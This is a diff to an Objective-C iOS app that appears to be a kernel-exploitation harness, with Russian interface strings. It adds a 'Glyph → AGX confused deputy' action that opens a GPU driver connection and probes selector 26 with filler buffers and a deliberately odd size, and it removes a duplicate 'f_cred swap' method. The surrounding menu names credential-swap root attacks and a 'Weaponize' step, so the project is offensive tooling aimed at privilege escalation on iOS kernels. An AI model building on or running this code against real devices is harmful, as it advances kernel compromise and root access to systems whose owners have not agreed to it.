@@ -434,6 +434,11 @@
                                             handler:^(UIAlertAction *a) {
         [weakSelf runFgAttack];
     }]];
+    [sheet addAction:[UIAlertAction actionWithTitle:@"Glyph → AGX confused deputy"
+                                              style:UIAlertActionStyleDefault
+                                            handler:^(UIAlertAction *a) {
+        [weakSelf runGlyphAgxDeputy];
+    }]];
     [sheet addAction:[UIAlertAction actionWithTitle:@"ucred heap swap (E9)"
                                               style:UIAlertActionStyleDefault
                                             handler:^(UIAlertAction *a) {
@@ -509,13 +514,47 @@
                                             handler:^(UIAlertAction *a) {
         [weakSelf runRootViaUcredRw];
     }]];
-    [sheet addAction:[UIAlertAction actionWithTitle:@"f_cred swap (file root)"
-                                              style:UIAlertActionStyleDefault
-                                            handler:^(UIAlertAction *a) {
-        [weakSelf runFgAttack];
-    }]];
     [sheet addAction:[UIAlertAction actionWithTitle:@"Отмена" style:UIAlertActionStyleCancel handler:nil]];
     [self presentViewController:sheet animated:YES completion:nil];
+}
+
+- (void)runGlyphAgxDeputy {
+    if (![self beginJob]) return;
+    self.statusLabel.text = @"Glyph → AGX confused deputy…";
+    [[KPLog shared] append:@"[RESULT] Glyph → AGX deputy — запуск"];
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        NSMutableString *r = [NSMutableString string];
+        [r appendString:@"\n=== Glyph → AGX confused deputy ===\n"];
+        // Open AGX connection
+        extern kern_return_t agx_tc_open(io_connect_t *out_conn, int *out_path);
+        extern kern_return_t agx_tc_sel26(io_connect_t conn,
+                                          const uint64_t scalars[4],
+                                          const void *in, size_t in_len);
+        io_connect_t conn = 0;
+        int path = 0;
+        kern_return_t kr = agx_tc_open(&conn, &path);
+        [r appendFormat:@"  agx open: kr=%d conn=%u path=%d\n", (int)kr, conn, path];
+        if (kr == KERN_SUCCESS && conn) {
+            // Try sel 26 with various input sizes
+            uint64_t scalars[4] = {0, 0, 0, 0};
+            uint8_t buf[256];
+            memset(buf, 0x41, sizeof(buf));
+            for (size_t sz = 8; sz <= 128; sz *= 2) {
+                kr = agx_tc_sel26(conn, scalars, buf, sz);
+                [r appendFormat:@"  sel26 in_len=%zu → kr=0x%x\n", sz, (int)kr];
+            }
+            // Try with a corrupted-looking size
+            kr = agx_tc_sel26(conn, scalars, buf, 0x42);  // our Glyph size
+            [r appendFormat:@"  sel26 in_len=0x42 → kr=0x%x\n", (int)kr];
+        }
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [[KPLog shared] append:r];
+            self.statusLabel.text = @"Glyph → AGX deputy завершён — см. лог";
+            [self saveExperimentReport:r fileName:@"kexproof-glyph-agx.txt"];
+            self.jobRunning = NO;
+            [self updateExperimentButtons];
+        });
+    });
 }
 
 - (void)runFgAttack {
@@ -712,22 +751,6 @@
             [[KPLog shared] append:report];
             self.statusLabel.text = @"Weaponize завершён — см. лог";
             [self saveExperimentReport:report fileName:@"kexproof-weaponize.txt"];
-            self.jobRunning = NO;
-            [self updateExperimentButtons];
-        });
-    });
-}
-
-- (void)runFgAttack {
-    if (![self beginJob]) return;
-    self.statusLabel.text = @"f_cred swap…";
-    [[KPLog shared] append:@"[RESULT] f_cred swap — запуск"];
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        NSString *report = [KPDump fgAttackReport];
-        dispatch_async(dispatch_get_main_queue(), ^{
-            [[KPLog shared] append:report];
-            self.statusLabel.text = @"f_cred swap завершён — см. лог";
-            [self saveExperimentReport:report fileName:@"kexproof-fgattack.txt"];
             self.jobRunning = NO;
             [self updateExperimentButtons];
         });
